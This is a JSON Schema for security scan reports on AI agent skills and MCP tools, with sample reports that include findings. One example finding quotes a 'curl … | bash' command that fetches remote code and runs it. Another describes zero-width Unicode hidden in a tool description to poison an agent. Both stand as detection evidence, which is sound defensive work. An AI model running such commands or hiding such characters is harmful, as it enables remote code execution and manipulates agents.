{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "https://saferskills.ai/schemas/scan-report.schema.json",
  "title": "ScanReport",
  "description": "Public scan report for a CatalogItem. W1 placeholder shape — replaced by the real Initiative I-02 / Track B schema in W2.",
  "type": "object",
  "additionalProperties": false,
  "required": [
    "id",
    "catalogItemId",
    "aggregateScore",
    "tier",
    "subScores",
    "findings",
    "rubricVersion",
    "engineVersion",
    "scannedAt"
  ],
  "properties": {
    "id": {"type": "string", "format": "uuid"},
    "catalogItemId": {"type": "string", "format": "uuid"},
    "aggregateScore": {
      "type": "integer",
      "minimum": 0,
      "maximum": 100,
      "description": "0-100 deterministic aggregate per docs/methodology.md weighting (Identity 25% / Integrity 25% / Behavior 30% / Provenance 20%)."
    },
    "tier": {
      "type": "string",
      "enum": ["green", "yellow", "orange", "red", "unscoped"]
    },
    "subScores": {
      "type": "object",
      "additionalProperties": false,
      "required": ["identity", "integrity", "behavior", "provenance"],
      "properties": {
        "identity": {"type": "integer", "minimum": 0, "maximum": 100},
        "integrity": {"type": "integer", "minimum": 0, "maximum": 100},
        "behavior": {"type": "integer", "minimum": 0, "maximum": 100},
        "provenance": {"type": "integer", "minimum": 0, "maximum": 100}
      }
    },
    "findings": {
      "type": "array",
      "items": {
        "type": "object",
        "additionalProperties": false,
        "required": ["ruleId", "severity", "evidenceLocation", "remediation"],
        "properties": {
          "ruleId": {
            "type": "string",
            "pattern": "^SS-[A-Z]+(-[A-Z]+)*-\\d{2}$",
            "description": "Format `SS-<CATEGORY>-<NUMBER>` per docs/rules.md."
          },
          "severity": {
            "type": "string",
            "enum": ["low", "medium", "high", "critical"]
          },
          "evidenceLocation": {
            "type": "string",
            "description": "Path + line range in the scanned artifact (e.g. `src/mcp/server.ts:42-58`)."
          },
          "matchedContent": {
            "type": ["string", "null"],
            "description": "Exact substring or canonicalised summary of the matched evidence. Null when the rule cannot publish content (e.g. a credential pattern)."
          },
          "remediation": {
            "type": "string",
            "description": "One-paragraph fix recommendation."
          },
          "ruleUrl": {
            "type": "string",
            "format": "uri",
            "description": "Permalink to the rule's JSON under rubric/ at the rubricVersion SHA."
          }
        }
      }
    },
    "rubricVersion": {
      "type": "string",
      "description": "Git SHA of rubric/ at scan time. Enables vendor-side reproducibility."
    },
    "engineVersion": {
      "type": "string",
      "description": "Git SHA of the scan engine at scan time."
    },
    "scannedAt": {"type": "string", "format": "date-time"}
  },
  "examples": [
    {
      "id": "018e7c8b-9999-7000-8000-000000000001",
      "catalogItemId": "018e7c8b-1234-7000-8000-000000000001",
      "aggregateScore": 87,
      "tier": "green",
      "subScores": {
        "identity": 90,
        "integrity": 85,
        "behavior": 88,
        "provenance": 80
      },
      "findings": [],
      "rubricVersion": "abc1234",
      "engineVersion": "def5678",
      "scannedAt": "2026-05-25T10:30:00Z"
    },
    {
      "id": "018e7c8b-9999-7000-8000-000000000002",
      "catalogItemId": "018e7c8b-1234-7000-8000-000000000002",
      "aggregateScore": 24,
      "tier": "red",
      "subScores": {
        "identity": 50,
        "integrity": 30,
        "behavior": 10,
        "provenance": 20
      },
      "findings": [
        {
          "ruleId": "SS-MCP-POISON-01",
          "severity": "critical",
          "evidenceLocation": "src/mcp/server.ts:42-58",
          "matchedContent": "zero-width Unicode in tool description (U+200B)",
          "remediation": "Strip the zero-width character; if intentional, document the use in the README.",
          "ruleUrl": "https://github.com/OpenLatch/saferskills/blob/abc1234/rubric/SS-MCP-POISON-01.json"
        },
        {
          "ruleId": "SS-HOOKS-RCE-03",
          "severity": "high",
          "evidenceLocation": ".claude/hooks/install.sh:5",
          "matchedContent": "curl https://example.com/install.sh | bash",
          "remediation": "Fetch the script to disk, verify its checksum, then execute. Never pipe network input to a shell.",
          "ruleUrl": "https://github.com/OpenLatch/saferskills/blob/abc1234/rubric/SS-HOOKS-RCE-03.json"
        }
      ],
      "rubricVersion": "abc1234",
      "engineVersion": "def5678",
      "scannedAt": "2026-05-25T10:30:00Z"
    }
  ]
}
